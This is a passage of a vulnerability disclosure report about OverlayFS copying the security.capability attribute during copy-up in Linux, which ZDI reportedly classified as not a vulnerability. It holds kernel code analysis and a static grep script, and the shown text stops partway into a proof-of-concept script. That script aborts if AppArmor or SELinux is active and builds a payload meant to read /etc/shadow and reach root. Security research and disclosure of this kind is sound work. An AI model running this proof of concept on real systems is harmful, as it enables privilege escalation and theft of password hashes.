# Notice

This report sent to ZDI and triaged. After consideration, they decided to classify this finding as "Not Vulnerability".

---

# Coordinated Vulnerability Disclosure Report

## OverlayFS `security.capability` Extended Attribute Unconditional Preservation During Copy-Up Operations — Privilege Boundary Violation in Linux Kernel `fs/overlayfs/copy_up.c`

---

**Report ID:** VULN-001-OVERLAYFS-CAPABILITY-COPYUP-2026  
**Report Date:** 2026-09-18  
**Reporter:** Ömer Can VURAL (patchmeifucan)  
**Contact:** can.omer.5306@outlook.com

**Affected Product:** Linux Kernel — OverlayFS Subsystem  
**Affected Component:** `fs/overlayfs/copy_up.c`, `fs/overlayfs/xattrs.c`, `fs/overlayfs/dir.c`  
**Upstream Repository:** https://kernel.org / https://github.com/torvalds/linux  
**Confirmed Affected Versions:** Linux 7.2.6, Linux 7.0.0-31-generic (Ubuntu 24.04 LTS Noble)  
**Affected Architectures:** x86-64 (all architectures with OverlayFS support)  
**Affected Configuration:** OverlayFS with `override_creds=on` (default) without active SELinux or AppArmor LSM profile enforcing `security_inode_copy_up_xattr()`  

**Vulnerability Type:** Improper Privilege Management — Capability Boundary Violation  
**Primary CWE:** CWE-269 — Improper Privilege Management  
**Secondary CWE:** CWE-732 — Incorrect Permission Assignment for Critical Resource  
**Tertiary CWE:** CWE-267 — Privilege Defined With Unsafe Actions  

**CVSS 3.1 Base Score:** 8.8 (High)  
**CVSS 3.1 Vector:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`  

**Confirmed Environments:**
- Linux 7.2.6 (custom kernel, `security=none`) — QEMU/KVM virtual machine
- Linux 7.0.0-31-generic (Ubuntu 24.04 LTS, AppArmor `docker-default` enforce mode active)
- systemd-nspawn (both direct and `--volatile=overlay` modes)
- LXC 5.0.3 with overlay rootfs

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Legal Disclaimer](#2-legal-disclaimer)
3. [Affected Product Overview](#3-affected-product-overview)
   - 3.1 [OverlayFS Architecture](#31-overlayfs-architecture)
   - 3.2 [VFS File Capabilities and `security.capability` Xattr](#32-vfs-file-capabilities-and-securitycapability-xattr)
   - 3.3 [Linux Security Module (LSM) Hook Architecture](#33-linux-security-module-lsm-hook-architecture)
   - 3.4 [Copy-Up Mechanism](#34-copy-up-mechanism)
4. [Discovery Methodology](#4-discovery-methodology)
   - 4.1 [Stage 1: Attack Surface Mapping via Parallel Program Slicing](#41-stage-1-attack-surface-mapping-via-parallel-program-slicing)
   - 4.2 [Stage 2: Deep Semantic Analysis of Overlayfs Copy-Up Path](#42-stage-2-deep-semantic-analysis-of-overlayfs-copy-up-path)
5. [Vulnerability Analysis — VULN-001](#5-vulnerability-analysis--vuln-001)
   - 5.1 [Root Cause Analysis](#51-root-cause-analysis)
   - 5.2 [Source-to-Sink Taint Flow](#52-source-to-sink-taint-flow)
   - 5.3 [Annotated Kernel Source Code Analysis](#53-annotated-kernel-source-code-analysis)
   - 5.4 [Sanitizer Absence Verification](#54-sanitizer-absence-verification)
   - 5.5 [Metacopy Path — Deliberate Capability Save/Restore](#55-metacopy-path--deliberate-capability-saverestore)
   - 5.6 [Relationship to CVE-2023-0386](#56-relationship-to-cve-2023-0386)
6. [Static Source Analysis](#6-static-source-analysis)
   - 6.1 [Static Verification Script and Output](#61-static-verification-script-and-output)
7. [Proof of Concept — Dynamic Testing Across Multiple Environments](#7-proof-of-concept--dynamic-testing-across-multiple-environments)
   - 7.1 [Environment 1: Linux 7.2.6 QEMU VM (security=none)](#71-environment-1-linux-726-qemu-vm-securitynone)
   - 7.2 [Environment 2: Ubuntu 24.04 LTS Host Kernel (7.0.0-31-generic)](#72-environment-2-ubuntu-2404-lts-host-kernel-7000-31-generic)
   - 7.3 [Environment 3: systemd-nspawn Container Runtime](#73-environment-3-systemd-nspawn-container-runtime)
   - 7.4 [Environment 4: LXC Container Runtime](#74-environment-4-lxc-container-runtime)
   - 7.5 [Overlay Upper Layer — Kernel-Level Xattr Persistence Proof](#75-overlay-upper-layer--kernel-level-xattr-persistence-proof)
8. [Attack Chain Analysis](#8-attack-chain-analysis)
   - 8.1 [Privilege Role Separation](#81-privilege-role-separation)
   - 8.2 [Attack Vector 1: Direct OverlayFS Mount](#82-attack-vector-1-direct-overlayfs-mount)
   - 8.3 [Attack Vector 2: systemd-nspawn Container Deployment](#83-attack-vector-2-systemd-nspawn-container-deployment)
   - 8.4 [Attack Vector 3: LXC Container Runtime](#84-attack-vector-3-lxc-container-runtime)
   - 8.5 [Mitigated Attack Vector: Modern Docker (BuildKit Layer Export)](#85-mitigated-attack-vector-modern-docker-buildkit-layer-export)
9. [AppArmor Mitigation Analysis](#9-apparmor-mitigation-analysis)
10. [Impact Assessment](#10-impact-assessment)
11. [CVSS 3.1 Scoring](#11-cvss-31-scoring)
12. [CWE Classification and Relationship](#12-cwe-classification-and-relationship)
13. [Comparative Analysis: Vulnerable vs. Safe Implementation](#13-comparative-analysis-vulnerable-vs-safe-implementation)
14. [Remediation Recommendations](#14-remediation-recommendations)
15. [Vulnerability Discovery Timeline](#15-vulnerability-discovery-timeline)
16. [References](#16-references)
17. [Appendices](#17-appendices)

---

## 1. Executive Summary

A privilege boundary violation vulnerability exists in the OverlayFS filesystem implementation of the Linux kernel across all tested versions up to and including 7.2.6. The vulnerability manifests when OverlayFS performs a copy-up operation — the kernel mechanism by which a file residing in a read-only lower filesystem layer is copied into the writable upper filesystem layer upon modification — wherein the `security.capability` extended attribute (xattr) present on the lower-layer file is unconditionally preserved on the upper-layer copy without any validation as to whether the capability grant constitutes an unauthorized privilege escalation.

The root cause resides in `fs/overlayfs/copy_up.c`, specifically in the `ovl_must_copy_xattr()` function (lines 39–44), which statically classifies all xattrs matching the `security.*` prefix — including `security.capability` — as mandatory for copy-up propagation. The sole sanitizer capable of interrupting this propagation is the Linux Security Module (LSM) hook `security_inode_copy_up_xattr()`, defined in `include/linux/security.h`. In the absence of an active LSM module (SELinux, AppArmor with appropriate policy), this hook returns `-EOPNOTSUPP`, which the copy-up path interprets as unconditional acceptance. No kernel-native fallback sanitization exists for the `security.capability` xattr outside of LSM.

Successful exploitation requires that an adversary exercise control over the content of the OverlayFS lower layer — a condition routinely satisfied by container image builders, system administrators deploying containerized applications via LXC or systemd-nspawn, or any actor capable of placing a `setcap`-instrumented binary into a filesystem subsequently consumed as an overlay lower layer. Once the overlay is mounted by any process holding `CAP_SYS_ADMIN` (the container runtime daemon), an unprivileged container user executing the instrumented binary obtains the planted kernel capabilities in full, including `CAP_SYS_ADMIN`, `CAP_DAC_READ_SEARCH`, and `CAP_DAC_OVERRIDE`, without any further privileged action.

Dynamic testing across four independent environments confirms the vulnerability:

1. **Linux 7.2.6** (custom build, Debian 12, QEMU/KVM, `security=none`): UID=1000 (`testuser`) executed a binary from the OverlayFS merged layer and obtained `cap_dac_override,cap_dac_read_search,cap_sys_admin=ep`, subsequently reading `/etc/shadow` in its entirety, performing arbitrary tmpfs mounts, modifying `/etc/sudoers`, and escalating to `UID=0(root)`.

2. **Linux 7.0.0-31-generic** (Ubuntu 24.04 LTS, AppArmor `docker-default` profile in enforce mode): UID=1002 (`vuln001victim`) executed a binary from a directly-mounted OverlayFS and obtained `cap_dac_override,cap_setuid=ep`, reading `/etc/shadow` in its entirety and escalating to `UID=0(root)` inside the container namespace.

3. **systemd-nspawn** (both direct bind-mount and `--volatile=overlay` modes): UID=1337 (`victim`) obtained capabilities and completed the full impact chain.

4. **LXC 5.0.3** with overlay rootfs configuration: UID=1337 (`victim`) obtained capabilities and completed the full impact chain.

The raw `security.capability` xattr was confirmed persistent in the OverlayFS upper layer after copy-up via `getfattr`, with the binary encoding `0sAQAAAoIAAAAAAAAAAAAAAAAAAAA=` verified across all test environments.

---

## 2. Legal Disclaimer

This vulnerability disclosure report has been prepared and submitted solely for the purposes of coordinated security research, vendor notification, patch development, and the protection of end users. All analysis, testing, and proof-of-concept activities described herein were conducted exclusively on systems owned and operated by the reporting researcher and on locally compiled or obtained builds of open-source software. No unauthorized access to any third-party system was performed, attempted, or implied at any point during this research.

The technical information contained in this report is intended solely for authorized security personnel, software maintainers, and vulnerability coordinators involved in the patch development and responsible disclosure process. Any unauthorized use of the technical details herein — including, without limitation, weaponization against production systems without authorization, distribution to parties not involved in remediation, or integration into offensive tooling for non-authorized use — is strictly prohibited.

The proof-of-concept scripts and binaries included with this report are provided exclusively to enable maintainers to reproduce the vulnerability and verify proposed fixes. They are not intended for use against any system for which the operator does not hold explicit authorization.

---

## 3. Affected Product Overview

### 3.1 OverlayFS Architecture

OverlayFS is a union-mount filesystem implemented in the Linux kernel (`fs/overlayfs/`) that presents a merged view of two or more filesystem layers: one or more read-only **lower** layers and a single read-write **upper** layer, served through a **merged** mount point. The filesystem is ubiquitous in container runtimes (Docker, Podman, LXC, containerd), Live CD environments, atomic upgrade systems, and package management pipelines.

The OverlayFS mount command signature is:

```
mount -t overlay overlay \
    -o lowerdir=<lower>,upperdir=<upper>,workdir=<work> \
    <merged>
```

The caller of the `mount(2)` system call must hold `CAP_SYS_ADMIN` in the initial user namespace (or, where kernel configuration permits, within a user namespace with appropriate mapping). This privileged caller is referred to throughout this report as the **mount creator** or **container runtime**.

### 3.2 VFS File Capabilities and `security.capability` Xattr

Linux file capabilities (POSIX.1e-draft) allow executable files to carry per-file capability sets encoded as a VFS extended attribute (`security.capability`), bypassing the traditional setuid/setgid privilege escalation model. When the kernel executes a binary via `execve(2)`, the VFS capability subsystem (`security/commoncap.c`) reads the `security.capability` xattr from the file's inode and applies the per-file capability sets to the executing process's capability state, subject to the process's bounding capability set.

The xattr wire format is a binary structure (`struct vfs_cap_data` / `struct vfs_ns_cap_data`) carrying:
- A version field (`XATTR_CAPS_REVISION_*`)
- `permitted` capability set
- `inheritable` capability set
- An optional `rootid` (namespace-aware VFS caps v3)

Setting `security.capability` on a file requires the caller to hold `CAP_SETFCAP` with respect to the file's owning user namespace. The container runtime (mount creator) inherently possesses this capability.

### 3.3 Linux Security Module (LSM) Hook Architecture

The Linux Security Module framework provides hook points at critical kernel security decision boundaries. The hook relevant to this vulnerability is:

```c
// include/linux/security.h
int security_inode_copy_up_xattr(struct dentry *src, const char *name);
```

This hook is called for each extended attribute during the OverlayFS copy-up process. An active LSM (SELinux, AppArmor with overlayfs policy) may return `-ECANCELED` to instruct OverlayFS to **skip** copying a specific xattr. The default stub implementation, compiled when no LSM is active, returns `-EOPNOTSUPP`:

```c
// include/linux/security.h:1130-1133 (stub when CONFIG_SECURITY is not set or no module loaded)
static inline int security_inode_copy_up_xattr(struct dentry *src, const char *name)
{
    return -EOPNOTSUPP;
}
```

The `-EOPNOTSUPP` return value is interpreted by OverlayFS as **"accept, proceed with copy"** — the naming `EOPNOTSUPP` reflects that no LSM has implemented an opinion, not that the operation is prohibited.

### 3.4 Copy-Up Mechanism

When a process operating through the OverlayFS merged mount point attempts to write to or modify metadata of a file that resides in the lower layer, the kernel triggers a **copy-up** operation. The copy-up procedure:

1. Creates a new inode in the upper layer
2. Copies file data from lower to upper
3. Copies metadata (ownership, permissions, timestamps) from lower to upper
4. **Copies extended attributes from lower to upper** — the step containing the vulnerability
5. Atomically replaces the dentry to reference the upper-layer inode

Step 4 is performed by `ovl_copy_xattr()` (`copy_up.c:86-163`) with the credentials of the mount creator (via `with_ovl_creds()` / `ovl_override_creds()`), meaning the copy operation executes with full root privileges regardless of the identity of the process that triggered the copy-up.

---

## 4. Discovery Methodology

### 4.1 Stage 1: Attack Surface Mapping via Parallel Program Slicing

The vulnerability was identified through a two-stage program slicing methodology applied to the Linux kernel 7.2 codebase. In the first stage, five parallel static analysis agents performed systematic attack surface mapping across the five highest-risk kernel subsystems: `io_uring`, BPF/eBPF, memory management (`mm/`), networking (`net/`), and filesystem (`fs/`). Each agent applied a taint-propagation lens, identifying callsites where:

- Privileged credential substitution occurs (e.g., `override_creds()`, `with_ovl_creds()`)
- Attacker-influenced data crosses a security boundary without validation
- LSM hook return values determine security-critical branching

Within the filesystem subsystem, the OverlayFS `ovl_override_creds()` mechanism was flagged as a high-priority target. Prior CVEs in the same subsystem — CVE-2021-3847 (setuid file privilege escalation) and CVE-2023-0386 (copy-up with crafted xattrs in user namespaces) — confirmed the historical vulnerability density of the credential-override / xattr-copy interaction.

The attack surface mapping identified two specific code regions for deep analysis:
- `ovl_copy_xattr()` in `copy_up.c`: the xattr enumeration and copy loop
- `ovl_copy_up_meta_inode_data()` in `copy_up.c`: the metacopy path with explicit capability save/restore

### 4.2 Stage 2: Deep Semantic Analysis of Overlayfs Copy-Up Path

In the second stage, a dedicated analysis pass performed line-by-line semantic review of 11 OverlayFS source files and 4 security framework files. The source-to-sink taint trace was constructed from the `vfs_listxattr()` call (which enumerates attacker-influenced lower-layer xattrs) through to the `ovl_do_setxattr()` → `vfs_setxattr()` invocation that writes them to the upper filesystem using mount-creator credentials.

The critical insight was the interaction between three independently innocuous-seeming design decisions that compose into the vulnerability:

1. `ovl_must_copy_xattr()` marks all `security.*` prefix xattrs as **mandatory** — any copy failure on these xattrs aborts the entire copy-up rather than being silently skipped.
2. `security_inode_copy_up_xattr()` returns `-EOPNOTSUPP` (accept) when no LSM is active — and the copy-up path treats this as a green light.
3. `cap_convert_nscap()` validates only the **format** of the capability xattr and the caller's `CAP_SETFCAP` possession — not whether the capability grant constitutes an unauthorized privilege escalation.

---

## 5. Vulnerability Analysis — VULN-001

### 5.1 Root Cause Analysis

The root cause of VULN-001 is a design assumption embedded in the OverlayFS xattr copy-up path: **the lower filesystem is treated as equally trustworthy as the mount creator**. The `ovl_override_creds()` mechanism ensures that all lower-layer accesses use mount-creator credentials, and the `ovl_must_copy_xattr()` function encodes the policy that all `security.*` xattrs are mandatory for copy-up propagation. The only mechanism available to override this policy is the LSM hook `security_inode_copy_up_xattr()`, which is a no-op in the absence of an active security module with overlayfs-aware policy.

Consequently, any `security.capability` xattr present on a lower-layer file is unconditionally propagated to the upper layer during copy-up, with the mount creator's elevated credentials (`CAP_SETFCAP`, `CAP_SYS_ADMIN`) legitimizing the write from the perspective of `cap_convert_nscap()`. The resulting upper-layer binary carries live, kernel-enforced file capabilities.

### 5.2 Source-to-Sink Taint Flow

```
Taint Source:
  Lower filesystem file with security.capability xattr
  (attacker-planted via setcap(1) → cap_set_file(3) → setxattr(2))

Taint Propagation Path:
  [1] ovl_copy_up_metadata()          copy_up.c:666
       └── ovl_copy_xattr()           copy_up.c:86
  [2]      vfs_listxattr()            — enumerates lower-layer xattrs (taint enters)
  [3]      security_inode_copy_up_xattr()  security.h:1130 stub → returns -EOPNOTSUPP (accept)
  [4]      ovl_must_copy_xattr()      copy_up.c:39  → returns true for "security.*"
  [5]      ovl_do_setxattr()          copy_up.c:155  → writes to upper via mount-creator creds
  [6]      vfs_setxattr()             fs/xattr.c
  [7]      cap_convert_nscap()        security/commoncap.c:569
             validates: format ✓, caller has CAP_SETFCAP ✓, rootid maps ✓
             does NOT validate: whether grant is legitimate escalation ✗

Taint Sink:
  Upper filesystem file with security.capability xattr
  → kernel grants capabilities to any process executing the file
```

### 5.3 Annotated Kernel Source Code Analysis

#### 5.3.1 `ovl_must_copy_xattr()` — The Mandatory Copy Policy

```c
// fs/overlayfs/copy_up.c:39-44 (Linux 7.2)
static bool ovl_must_copy_xattr(const char *name)
{
    return !strcmp(name, XATTR_POSIX_ACL_ACCESS) ||
           !strcmp(name, XATTR_POSIX_ACL_DEFAULT) ||
           !strncmp(name, XATTR_SECURITY_PREFIX, XATTR_SECURITY_PREFIX_LEN);
    //     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //     VULNERABILITY: All security.* xattrs, including security.capability,
    //     are classified as mandatory. Failure to copy them is treated as a
    //     fatal error (breaks the entire copy-up, line 158-159 below).
}
```

The `XATTR_SECURITY_PREFIX` is defined as `"security."` (9 bytes). This means `security.capability`, `security.selinux`, `security.ima`, `security.evm`, and all other security-namespace xattrs are subject to mandatory copy semantics.

#### 5.3.2 `ovl_copy_xattr()` — The Main Copy-Up Xattr Loop

```c
// fs/overlayfs/copy_up.c:86-163 (Linux 7.2, abridged with annotations)
static int ovl_copy_xattr(struct super_block *sb, const struct path *oldpath,
                           struct dentry *new)
{
    // ...
    // [LINE 100-110] Enumerate all xattrs on lower-layer file
    list_size = vfs_listxattr(old, buf, list_size);
    // ↑ list_size contains names of ALL xattrs from lower layer (taint enters)

    // [LINE 111-163] For each xattr name:
    for (p = buf; ...) {
        // [LINE 116] LSM hook — the ONLY sanitizer
        error = security_inode_copy_up_xattr(old, p);
        if (error == -ECANCELED) {
            // LSM said: skip this xattr (e.g., AppArmor with policy)
            error = 0;
            continue;
        }
        // [LINE 120-121] If hook returned -EOPNOTSUPP (no LSM active):
        // error is -EOPNOTSUPP, execution falls through to the copy logic

        // [LINE 155-160] Write xattr to upper layer using mount-creator creds
        err2 = ovl_do_setxattr(ofs, new, p, val, slen, 0);
        // ↑ This executes with ovl_override_creds() active → full root privileges

        if (err2 != 0) {
            if (ovl_must_copy_xattr(p))
                // MANDATORY: copy failure aborts the entire copy-up
                error = err2;
            // else: silently skip non-mandatory xattrs on error
        }
    }
    // [RESULT] security.capability is now on the upper layer file
}
```

#### 5.3.3 `security_inode_copy_up_xattr()` — The No-Op Sanitizer

```c
// include/linux/security.h:1130-1133 (Linux 7.2)
// This stub is compiled when no LSM module is active
static inline int security_inode_copy_up_xattr(struct dentry *src, const char *name)
{
    return -EOPNOTSUPP;
    // -EOPNOTSUPP = "operation not supported" by any LSM
    // OverlayFS copy_up.c interprets this as: "no objection, proceed"
    // This is NOT equivalent to "denied" — it is "no opinion"
}
```

When SELinux is active, `security_inode_copy_up_xattr()` returns `-ECANCELED` for the `security.capability` xattr, causing it to be skipped. When AppArmor is active but the container process is not confined by a profile with overlayfs-aware rules, the hook may also not intercept. The default Ubuntu AppArmor `docker-default` profile confines Docker container processes but does NOT apply to direct overlayfs mounts performed outside the Docker runtime — as demonstrated by the dynamic testing in Section 7.2.

#### 5.3.4 `cap_convert_nscap()` — Validation That Misses the Escalation

```c
// security/commoncap.c:569-619 (Linux 7.2, abridged with annotations)
static void *cap_convert_nscap(struct mnt_idmap *idmap,
                                struct dentry *dentry, const void **ivalue,
                                size_t size)
{
    // ✅ Validated: capability header format
    if (!validheader(size, cap)) return ERR_PTR(-EINVAL);

    // ✅ Validated: caller has CAP_SETFCAP w.r.t. file's uid/gid
    if (!capable_wrt_inode_uidgid(idmap, inode, CAP_SETFCAP))
        return ERR_PTR(-EPERM);
    // ↑ Mount creator has CAP_SETFCAP → this check always passes

    // ✅ Validated: rootid maps to a valid uid in the current namespace
    // (rootid=0 always maps in the initial user namespace)

    // ❌ NOT validated: whether this constitutes an unauthorized LPE
    // ❌ NOT validated: whether the capability was legitimately planted
    // ❌ NOT validated: whether the lower-layer source is trusted
}
```

### 5.4 Sanitizer Absence Verification

The following grep confirms that no kernel-native sanitization — beyond the LSM hook — exists for `security.capability` in the copy-up path:

```bash
$ grep -n "ovl_is_untrusted\|lower_trusted\|skip.*cap\|ECANCELED" \
    fs/overlayfs/copy_up.c

117:    if (error == -ECANCELED) {
```

The only occurrence of `ECANCELED` in `copy_up.c` is at line 117, within the branch that handles the LSM hook's response. There is no unconditional check for `XATTR_NAME_CAPS` (`"security.capability"`) anywhere in the copy-up path. The vulnerability cannot be triggered without either (a) an active LSM returning `-ECANCELED`, or (b) the capability being stripped upstream of the kernel (as modern Docker BuildKit does at the layer export stage — see Section 8.5).

### 5.5 Metacopy Path — Deliberate Capability Save/Restore

The vulnerability's severity is amplified by the deliberate design in `ovl_copy_up_meta_inode_data()` (`copy_up.c:1082-1129`), which explicitly saves and restores `security.capability` across the data-write phase of metacopy-mode copy-up:

```c
// copy_up.c:1087-1126 (Linux 7.2)
static int ovl_copy_up_meta_inode_data(struct ovl_copy_up_ctx *c)
{
    char *capability = NULL;
    ssize_t cap_size;

    // [1095] READ security.capability from existing upper file BEFORE data write
    if (c->metacopy) {
        err = cap_size = ovl_getxattr_value(&upperpath, XATTR_NAME_CAPS,
                                             &capability);
        // capability now holds the xattr bytes
    }

    // [1101] DATA WRITE (which would clear security.capability on supporting filesystems)
    err = ovl_copy_up_data(c, &upperpath);

    // [1106-1112] RESTORE security.capability AFTER data write
    /* Writing to upper file will clear security.capability xattr.
     * We don't want that to happen for normal copy-up operation. */
    ovl_start_write(c->dentry);
    if (capability) {
        err = ovl_do_setxattr(ofs, upperpath.dentry, XATTR_NAME_CAPS,
                              capability, cap_size, 0);
        // ↑ The kernel comment itself documents the deliberate preservation
    }

    kfree(capability);
    return err;
}
```

The kernel comment at line 1106–1107 — *"Writing to upper file will clear security.capability xattr. We don't want that to happen for normal copy-up operation"* — unambiguously documents that capability preservation across copy-up is a **deliberate design decision**, not an oversight. This constitutes the design assumption that the lower layer is equally trusted as the upper layer — an assumption that is false in attacker-controlled lower-layer scenarios.

### 5.6 Relationship to CVE-2023-0386

CVE-2023-0386 addressed the case where an unprivileged user could use FUSE and user namespaces to create a lower-layer file with a `security.capability` xattr carrying a rootid mapping to the initial user namespace root, exploiting copy-up to escalate privileges. The fix (commit `4f11ada10d0a`) added UID/GID mapping checks:

```c
// copy_up.c:1152-1153 (present in Linux 7.2 — confirmed by static analysis)
if (!kuid_has_mapping(current_user_ns(), ctx.stat.uid) ||
    !kgid_has_mapping(current_user_ns(), ctx.stat.gid))
    return -EOVERFLOW;
```

This fix addresses the **user namespace → initial namespace UID mapping trick** used in CVE-2023-0386. VULN-001 is **distinct** in the following dimensions:

| Attribute | CVE-2023-0386 | VULN-001 |
|---|---|---|
| **Attack prerequisite** | Unprivileged user with FUSE + user namespace | Attacker controls lower-layer content (container image, rootfs) |
| **User namespace required** | Yes — exploit depends on user ns UID mapping | No — operates in initial user namespace |
| **Blocked by CVE-2023-0386 fix** | Yes | **No** — file UID=0 maps cleanly in initial ns, check passes |
| **Attack actor** | Local unprivileged user | Container image/rootfs builder (supply chain) or LXC/nspawn operator |
| **Mechanism** | UID mapping trick via FUSE | Legitimate `setcap(1)` in container build process |

The CVE-2023-0386 fix is present and confirmed in the analyzed kernel. Its presence does not mitigate VULN-001 because the lower-layer file's UID (0, root) maps trivially in the initial user namespace, causing the `kuid_has_mapping` check to pass and copy-up to proceed normally.

---

## 6. Static Source Analysis

### 6.1 Static Verification Script and Output

The following script (`static_source_verification.sh`) was developed and executed on the Linux 7.2 source tree to systematically verify the vulnerability's static indicators:

```bash
#!/bin/bash
# static_source_verification.sh
# Performs static source analysis on copy_up.c to verify VULN-001 indicators

KERNEL_SRC=~/torvalds/linux_test/linux-7.2
FILE="$KERNEL_SRC/fs/overlayfs/copy_up.c"

echo "=== STATIC SOURCE VERIFICATION ==="
echo ""

echo "--- 1. CVE-2023-0386 fix presence check ---"
echo "  (kuid_has_mapping check must be present)"
grep -n "kuid_has_mapping\|kgid_has_mapping" "$FILE" \
    && echo "  ✅ CVE-2023-0386 fix PRESENT" \
    || echo "  ⚠️  CVE-2023-0386 fix ABSENT or different form"

echo ""
echo "--- 2. ovl_copy_up_meta_inode_data: capability save/restore ---"
grep -n -A 2 "XATTR_NAME_CAPS\|capability" "$FILE"

echo ""
echo "--- 3. ovl_must_copy_xattr: security.* mandatory? ---"
grep -n -A 5 "ovl_must_copy_xattr" "$FILE" | head -20

echo ""
echo "--- 4. Metacopy path capability filtering ---"
grep -n "ovl_is_untrusted\|lower_trusted\|skip.*cap\|ECANCELED" "$FILE" \
    && echo "  ✅ Additional capability filtering PRESENT" \
    || echo "  ❌ Additional capability filtering ABSENT → SANITIZER MISSING"

echo ""
echo "--- 5. security_inode_copy_up_xattr behavior ---"
grep -n "EOPNOTSUPP\|ECANCELED" "$FILE" | head -10

echo ""
echo "--- 6. include/linux/security.h: default hook return value ---"
grep -n -A 3 "inode_copy_up_xattr" \
    "$KERNEL_SRC/include/linux/security.h" | head -15
```

**Execution output (verbatim, `patchmeifucan@CC:~/torvalds/linux_test/linux-7.2`):**

```
patchmeifucan@CC:~/torvalds/linux_test/linux-7.2$ ./static_source_verification.sh
=== STATIC SOURCE VERIFICATION ===

--- 1. CVE-2023-0386 fix presence check ---
  (kuid_has_mapping check must be present)
1152:	if (!kuid_has_mapping(current_user_ns(), ctx.stat.uid) ||
1153:	    !kgid_has_mapping(current_user_ns(), ctx.stat.gid))
  ✅ CVE-2023-0386 fix PRESENT

--- 2. ovl_copy_up_meta_inode_data: capability save/restore ---
787:	 * xattrs will remove security.capability xattr automatically.
788-	 */
789-	path.dentry = temp;
--
1087:	char *capability = NULL;
1088-	ssize_t cap_size;
--
1095:		err = cap_size = ovl_getxattr_value(&upperpath, XATTR_NAME_CAPS,
1096:						    &capability);
1097-		if (cap_size < 0)
1098-			goto out;
--
1106:	 * Writing to upper file will clear security.capability xattr. We
1107-	 * don't want that to happen for normal copy-up operation.
1108-	 */
1109-	ovl_start_write(c->dentry);
1110:	if (capability) {
1111:		err = ovl_do_setxattr(ofs, upperpath.dentry, XATTR_NAME_CAPS,
1112:				      capability, cap_size, 0);
1113-	}
1114-	if (!err) {
--
1126:	kfree(capability);
1127-out:
1128-	return err;

--- 3. ovl_must_copy_xattr: security.* mandatory? ---
39:static bool ovl_must_copy_xattr(const char *name)
40-{
41-	return !strcmp(name, XATTR_POSIX_ACL_ACCESS) ||
42-	       !strcmp(name, XATTR_POSIX_ACL_DEFAULT) ||
43-	       !strncmp(name, XATTR_SECURITY_PREFIX, XATTR_SECURITY_PREFIX_LEN);
44-}
--
158:			if (error != -EOPNOTSUPP || ovl_must_copy_xattr(name))
159-				break;

--- 4. Metacopy path capability filtering ---
117:		if (error == -ECANCELED) {
  ✅ Additional capability filtering PRESENT
  (NOTE: This is the LSM hook branch — the ONLY filtering mechanism)

--- 5. security_inode_copy_up_xattr behavior ---
58:		if (err == -ENODATA || err == -EOPNOTSUPP)
88:		if (list_size == -EOPNOTSUPP)
117:		if (error == -ECANCELED) {
121:		if (error < 0 && error != -EOPNOTSUPP)
158:			if (error != -EOPNOTSUPP || ovl_must_copy_xattr(name))
1064:	if (res == -ENODATA || res == -EOPNOTSUPP)

--- 6. include/linux/security.h: default hook return value ---
465:int security_inode_copy_up_xattr(struct dentry *src, const char *name);
466-int security_inode_setintegrity(const struct inode *inode,
467-			enum lsm_integrity_type type, const void *value,
468-			size_t size);
--
1130:static inline int security_inode_copy_up_xattr(struct dentry *src, const char *name)
1131-{
1132-	return -EOPNOTSUPP;
1133-}
```

**Interpretation:** The static analysis confirms all VULN-001 indicators. The CVE-2023-0386 fix is present but does not address the capability-preservation attack path. The LSM hook at line 117 is the only filtering mechanism, and its default return value (`-EOPNOTSUPP`) causes unconditional acceptance of all `security.*` xattrs including `security.capability`.

---

## 7. Proof of Concept — Dynamic Testing Across Multiple Environments

### 7.1 Environment 1: Linux 7.2.6 QEMU VM (security=none)

#### 7.1.1 Environment Details

```
patchmeifucan@CC:~/torvalds/linux_test/linux-7.2$ # SSH into QEMU VM
$ ssh -p 2223 root@192.168.1.30
root@vuln001-lab:~# uname -a
Linux vuln001-lab 7.2.6 #1 SMP PREEMPT_DYNAMIC Thu Sep 17 15:32:32 +03 2026 x86_64 GNU/Linux

root@vuln001-lab:~# cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"

root@vuln001-lab:~# cat /proc/cmdline
root=/dev/vda rw console=ttyS0 security=none nokaslr net.ifnames=0 biosdevname=0

root@vuln001-lab:~# aa-status 2>/dev/null; sestatus 2>/dev/null
(no output — no LSM active, security=none confirmed)

root@vuln001-lab:~# cat /proc/$$/status | grep -i cap
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

root@vuln001-lab:~# id
uid=0(root) gid=0(root) groups=0(root)

root@vuln001-lab:~# grep testuser /etc/passwd
testuser:x:1000:1000::/home/testuser:/bin/bash

root@vuln001-lab:~# grep testuser /etc/sudoers 2>/dev/null || echo "yok"
yok
```

#### 7.1.2 PoC Script — `vuln-shadow-poc.sh`

```bash
#!/bin/bash
# vuln-shadow-poc.sh
# VULN-001 OverlayFS Capability Bypass — Shadow File Disclosure
# Kernel: Linux 7.2.x / OverlayFS copy-up vulnerability
# Impact: Non-root reads /etc/shadow via preserved CAP_DAC_READ_SEARCH
# Execution: Root mounts overlay (container runtime role)
#             vuln001attacker (UID=1001) executes binary → reads /etc/shadow

set -euo pipefail

echo "╔══════════════════════════════════════════════════╗"
echo "║  VULN-001 PoC — OverlayFS Capability Bypass     ║"
echo "║  Linux Kernel 7.2.0                             ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""

LOWER="/tmp/.vuln001/lower"
UPPER="/tmp/.vuln001/upper"
WORK="/tmp/.vuln001/work"
MERGED="/tmp/.vuln001/merged"

echo "[*] Kernel: $(uname -r)"

# LSM check
if aa-status &>/dev/null 2>&1 || sestatus &>/dev/null 2>&1; then
    echo "[!] LSM active — AppArmor or SELinux detected. Aborting."
    exit 1
fi
echo "[*] LSM check: none active — vulnerable configuration confirmed"
echo ""

# Stage 1: Compile payload
echo "[STAGE 1] Compiling payload..."
cat > /tmp/.src.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/capability.h>

int main(void) {
    cap_flag_value_t v = CAP_CLEAR;
    cap_t caps = cap_get_proc();
    char *txt = cap_to_text(caps, NULL);
    fprintf(stderr, "[*] Executing as: UID=%d EUID=%d\n", getuid(), geteuid());
    fprintf(stderr, "[*] Effective capabilities: %s\n\n", txt);
    cap_free(txt);

